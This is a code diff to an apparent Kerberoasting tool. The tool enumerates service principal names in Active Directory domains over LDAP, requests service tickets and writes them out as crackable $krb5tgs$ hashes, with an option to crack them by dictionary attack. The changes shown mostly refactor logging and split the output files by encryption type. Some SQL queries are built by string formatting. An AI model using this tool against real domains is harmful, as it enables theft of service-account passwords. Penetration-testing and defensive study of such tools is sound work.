@@ -68,7 +68,7 @@ class Database:
         try:
             self.cursor.execute(create_table_sql)
         except Error as e:
-            logging.info(e)
+            logger.info(e)
 
     def find_spn(self, domain, spn, samaccountname, pwdlastset):
         pwdlastsetDate = pwdlastset.split(' ')[0]
@@ -80,28 +80,28 @@ class Database:
         spnResult = cursor.execute(spnQuery).fetchall()
 
         if len(spnResult) is 0:
-            logging.info("        ** NEW SPN FOUND! Domain: "+domain+" SPN: "+spn+" sAMAccountName: "+samaccountname)
+            logger.info("        ** NEW SPN FOUND! Domain: "+domain+" SPN: "+spn+" sAMAccountName: "+samaccountname)
 
             samQuery = 'SELECT * FROM spn WHERE samaccountname=\'{samAccountNameValue}\''.format(samAccountNameValue=samaccountname)
             samResult = cursor.execute(samQuery).fetchall()
             if len(samResult) is 0:
-                logging.info("        ** SAMAccount did not have a SPN registered yet, so going to pull the TGS.")
+                logger.info("        ** SAMAccount did not have a SPN registered yet, so going to pull the TGS.")
                 results.append(spn)
                 results.append(samaccountname)
             else:
-                logging.info("        ** SAMAccount already had a SPN registered, so not going to pull the TGS.")
+                logger.info("        ** SAMAccount already had a SPN registered, so not going to pull the TGS.")
 
-            logging.info("        ** Adding the SPN to the database.")
+            logger.info("        ** Adding the SPN to the database.")
             cursor.execute("INSERT INTO spn (domain, servicePrincipalName, sAMAccountName, pwdLastSetDate) VALUES (?,?,?,?)", (domain, spn, samaccountname, pwdlastsetDate))
         elif len(spnResult) is 1:
             if pwdlastsetDate != spnResult[0][0]:
-                logging.info("        ** CHANGED PW FOUND! Domain: "+domain+" SPN: "+spn+" sAMAccountName: "+samaccountname+" old pwdlastsetDate value: "+spnResult[0][0]+ " new pwdlastsetDate value: "+pwdlastsetDate)
+                logger.info("        ** CHANGED PW FOUND! Domain: "+domain+" SPN: "+spn+" sAMAccountName: "+samaccountname+" old pwdlastsetDate value: "+spnResult[0][0]+ " new pwdlastsetDate value: "+pwdlastsetDate)
                 cursor.execute("UPDATE spn SET pwdLastSetDate=? WHERE sAMAccountName=?",(pwdlastsetDate, samaccountname))
                 results.append(spn)
                 results.append(samaccountname)
         else:
-            logging.info("        ** huh, more than 1 database match, something wrong here:")
-            logging.info("        ** domain: "+domain+" spn: "+ spn + " samaccountname "+ samaccountname + " pwdlastsetDate: " + pwdlastsetDate)
+            logger.info("        ** huh, more than 1 database match, something wrong here:")
+            logger.info("        ** domain: "+domain+" spn: "+ spn + " samaccountname "+ samaccountname + " pwdlastsetDate: " + pwdlastsetDate)
             raise
 
         self.commit()
@@ -138,7 +138,7 @@ class GetUserSPNS:
         # because then the KDC host will be used for both
         # the initial and the referral ticket, which breaks stuff.
         if user_domain != target_domain and self.__kdcHost:
-            logging.info('DC ip will be ignored because of cross-domain targeting.')
+            logger.info('DC ip will be ignored because of cross-domain targeting.')
             self.__kdcHost = None
 
 
@@ -181,12 +181,12 @@ class GetUserSPNS:
             else:
                 target = self.__targetDomain
 
-        logging.info("    ** Connecting to LDAP")
-        logging.debug("To LDAP server: "+target)
-        logging.debug("With BaseDN: "+self.__baseDN)
-        logging.debug("To KDC host: "+str(self.__kdcHost))
-        logging.debug("With auth domain: "+self.__domain)
-        logging.debug("And auth user: "+self.__username)
+        logger.info("    ** Connecting to LDAP")
+        logger.debug("To LDAP server: "+target)
+        logger.debug("With BaseDN: "+self.__baseDN)
+        logger.debug("To KDC host: "+str(self.__kdcHost))
+        logger.debug("With auth domain: "+self.__domain)
+        logger.debug("And auth user: "+self.__username)
         # Connect to LDAP
         try:
             ldapConnection = ldap.LDAPConnection('ldap://%s' % target, self.__baseDN, self.__kdcHost)
@@ -204,7 +204,7 @@ class GetUserSPNS:
                            "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"
 
 
-        logging.info("    ** Searching LDAP for SPNs")
+        logger.info("    ** Searching LDAP for SPNs")
         try:
             resp = ldapConnection.search(searchFilter=searchFilter,
                                          attributes=['servicePrincipalName', 'sAMAccountName',
@@ -214,7 +214,7 @@ class GetUserSPNS:
             if e.getErrorString().find('sizeLimitExceeded') >= 0:
                 # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                 # paged queries
-                logging.info("LDAP sizeLimitExceeded")
+                logger.info("LDAP sizeLimitExceeded")
                 resp = e.getAnswers()
                 pass
             else:
@@ -269,7 +269,7 @@ class GetUserSPNS:
                         for spn in SPNs:
                             answers.append([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation])
             except Exception as e:
-                logging.info('Skipping item, cannot process due to error %s' % str(e))
+                logger.info('Skipping item, cannot process due to error %s' % str(e))
                 pass
 
         return answers
@@ -287,15 +287,15 @@ class GetUserSPNS:
                 domain = ccache.principal.realm['data']
             else:
                 domain = self.__domain
-            logging.debug("Using Kerberos Cache: %s" % os.getenv('KRB5CCNAME'))
+            logger.debug("Using Kerberos Cache: %s" % os.getenv('KRB5CCNAME'))
             principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
             creds = ccache.getCredential(principal)
             if creds is not None:
                 TGT = creds.toTGT()
-                logging.debug('Using TGT from cache')
+                logger.debug('Using TGT from cache')
                 return TGT
             else:
-                logging.debug("No valid credentials found in cache. ")
+                logger.debug("No valid credentials found in cache. ")
 
         # No TGT in cache, request it
         userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
@@ -311,7 +311,7 @@ class GetUserSPNS:
                                                                 compute_nthash(self.__password), self.__aesKey,
                                                                 kdcHost=self.__kdcHost)
             except Exception as e:
-                logging.debug('TGT: %s' % str(e))
+                logger.debug('TGT: %s' % str(e))
                 tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                     unhexlify(self.__lmhash),
                                                                     unhexlify(self.__nthash), self.__aesKey,
@@ -339,13 +339,13 @@ class GetUserSPNS:
             TGT = self.getTGT()
 
             if self.__outputFileName is not None:
-                fd = open(self.__outputFileName, 'a')
+                fd = self.__outputFileName
             else:
                 fd = None
 
             for user, SPN in users.items():
 
-                logging.info("Getting TGS from user: "+user+" with SPN: "+SPN)
+                logger.info("Getting TGS from user: "+user+" with SPN: "+SPN)
 
                 sAMAccountName = user
                 downLevelLogonName = self.__targetDomain + "\\" + sAMAccountName
@@ -361,11 +361,14 @@ class GetUserSPNS:
                                                                             TGT['sessionKey'])
                     self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, self.__targetDomain + "/" + sAMAccountName, fd)
                 except Exception as e:
-                    logging.debug("Exception:", exc_info=True)
-                    logging.debug('Principal: %s - %s' % (downLevelLogonName, str(e)))
+                    logger.debug("Exception:", exc_info=True)
+                    logger.debug('Principal: %s - %s' % (downLevelLogonName, str(e)))
 
-            if fd is not None:
-                fd.close()
+
+    def writeTGS(self, fd, tgs):
+        writer = open(fd+"."+tgs.split('$')[2]+".krb5tgs", 'a')
+        writer.write(tgs + '\n')
+        writer.close()
 
 
     def outputTGS(self, tgs, oldSessionKey, sessionKey, username, spn, fd=None):
@@ -391,50 +394,54 @@ class GetUserSPNS:
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
             if fd is None:
-                logging.info(entry)
+                logger.info(entry)
             else:
-                fd.write(entry+'\n')
+                self.writeTGS(fd, entry)
+                #fd.write(entry+'\n')
         elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
             entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                 constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode)
             if fd is None:
-                logging.info(entry)
+                logger.info(entry)
             else:
-                fd.write(entry+'\n')
+                self.writeTGS(fd, entry)
+                #fd.write(entry+'\n')
         elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
             entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                 constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
             if fd is None:
-                logging.info(entry)
+                logger.info(entry)
             else:
-                fd.write(entry+'\n')
+                self.writeTGS(fd, entry)
+                #fd.write(entry+'\n')
         elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
             entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                 constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
             if fd is None:
-                logging.info(entry)
+                logger.info(entry)
             else:
-                fd.write(entry+'\n')
+                self.writeTGS(fd, entry)
+                #fd.write(entry+'\n')
         else:
-            logging.error('Skipping %s/%s due to incompatible e-type %d' % (
+            logger.error('Skipping %s/%s due to incompatible e-type %d' % (
                 decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
                 decodedTGS['ticket']['enc-part']['etype']))
 
         if self.__saveTGS is True:
             # Save the ticket
-            logging.debug('About to save TGS for %s' % username)
+            logger.debug('About to save TGS for %s' % username)
             ccache = CCache()
             try:
                 ccache.fromTGS(tgs, oldSessionKey, sessionKey )
                 ccache.saveFile('%s.ccache' % username)
             except Exception as e:
-                logging.error(str(e))
+                logger.error(str(e))
 
 
 
@@ -453,7 +460,7 @@ if __name__ == "__main__":
     parser.add_argument('-domainsfile', help='File with domains (FQDN) per line to test')
     parser.add_argument('-dbfile', help='SQLite3 DB file to use as a database')
     parser.add_argument('-crack', action='store', metavar = "wordlist", help='Automatically attempt to crack the TGS service ticket(s) using a dictionary attack with the provided wordlist (using John the Ripper)')
-    parser.add_argument('-outputfile', action='store', help='Output file to write new or changed SPNs to. A date and timestamp will be appended to the filename.')
+    parser.add_argument('-outputfile', action='store', help='Output file to write new or changed SPNs to. A date and timestamp will be appended to the filename as well as the encryption type ID of the TGS (23=rc4, 18=aes256, etc).')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
 
     options = parser.parse_args()
@@ -469,66 +476,75 @@ if __name__ == "__main__":
     options.request_user = None
     options.hashes = None
 
+    logger = logging.getLogger('logger')
+
     formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 
+
+
+    infoHandler = logging.FileHandler('info.log')
+    infoHandler.setLevel(logging.INFO)
+    infoHandler.setFormatter(formatter)
+    logging.getLogger().addHandler(infoHandler)
+
+    stdoutHandler = logging.StreamHandler(sys.stdout)
+    logging.getLogger().addHandler(stdoutHandler)
+
     if options.debug is True:
-        fh = logging.FileHandler('debug_' + datetime.now().strftime('%Y-%m-%d_%H-%M') + '.log')
-        logging.getLogger().setLevel(logging.DEBUG)
-        # Print the Library's installation path
-        logging.debug(version.getInstallationPath())
+        debugHandler = logging.FileHandler('debug_' + datetime.now().strftime('%Y-%m-%d_%H-%M') + '.log')
+        debugHandler.setLevel(logging.DEBUG)
+        debugHandler.setFormatter(formatter)
+        logging.getLogger().addHandler(debugHandler)
+
+        logger.setLevel(logging.DEBUG)
+        logger.debug(version.getInstallationPath())
     else:
-        fh = logging.FileHandler('info.log')
-        logging.getLogger().setLevel(logging.INFO)
-
-        handler = logging.StreamHandler(sys.stdout)
-        logging.getLogger().addHandler(handler)
-
-    fh.setFormatter(formatter)
-    logging.getLogger().addHandler(fh)
+        logger.setLevel(logging.INFO)
 
     authDomain, username, password = parse_credentials(options.credentials)
     db = Database(options.dbfile)
 
-
     try:
-        logging.info("Authenticating with domain: "+authDomain)
-        logging.info("With username: "+username)
-        logging.info("Loading domains from file: "+options.domainsfile)
-        logging.info("Storing state in: "+options.dbfile)
-        options.outputfile = options.outputfile + "_" + datetime.now().strftime('%Y-%m-%d_%H-%M') + ".log"
+        logger.info("Authenticating with domain: "+authDomain)
+        logger.info("With username: "+username)
+        logger.info("Loading domains from file: "+options.domainsfile)
+        logger.info("Storing state in: "+options.dbfile)
+        options.outputfile = options.outputfile + "_" + datetime.now().strftime('%Y-%m-%d_%H-%M')
 
-        logging.info("Outputting results in: "+options.outputfile)
+        logger.info("Outputting results in: "+options.outputfile)
 
         if not os.path.exists(options.dbfile):
-            logging.info("*** DATABASE NOT FOUND")
+            logger.info("*** DATABASE NOT FOUND")
             db.create_database()
-            logging.info("*** DATABASE CREATED")
+            logger.info("*** DATABASE CREATED")
         else:
-            logging.info("*** DATABASE FOUND")
+            logger.info("*** DATABASE FOUND")
             db.connect_database()
 
         with open(options.domainsfile) as fi:
             domains = [line.strip() for line in fi]
 
         for targetDomain in domains:
-            logging.info(" ** Starting enumerating domain: "+targetDomain)
+            logger.info(" ** Starting enumerating domain: "+targetDomain)
             getUserSPNS = GetUserSPNS(username, password, authDomain, targetDomain, options)
             domainAnswers = getUserSPNS.harvester()
 
             tgsList = []
             for spn in domainAnswers:
-                logging.debug("Found SPN: "+spn[0])
+                logger.debug("Found SPN: "+spn[0])
                 newSpn = db.find_spn(targetDomain, spn[0], spn[1], spn[3])
                 if newSpn:
                     tgsList.append(newSpn)
 
             if len(tgsList)>0:
                 getUserSPNS.getTGS(tgsList)
-                logging.info("    ** Results written to: "+options.outputfile)
+                logger.info("    ** Results written to: "+options.outputfile+".XX.krb5tgs, where XX is the encryption type id of the ticket.")
             else:
-                logging.info("    ** No new or changed SPNs found for domain: "+targetDomain)
+                logger.info("    ** No new or changed SPNs found for domain: "+targetDomain)
 
-            logging.info(" ** Finished enumerating domain: "+targetDomain)
+            logger.info(" ** Finished enumerating domain: "+targetDomain)
+
+        logger.info("Finished all domains")
 
         if options.crack is not None:
             print("Starting to crack using wordlist: "+options.crack)
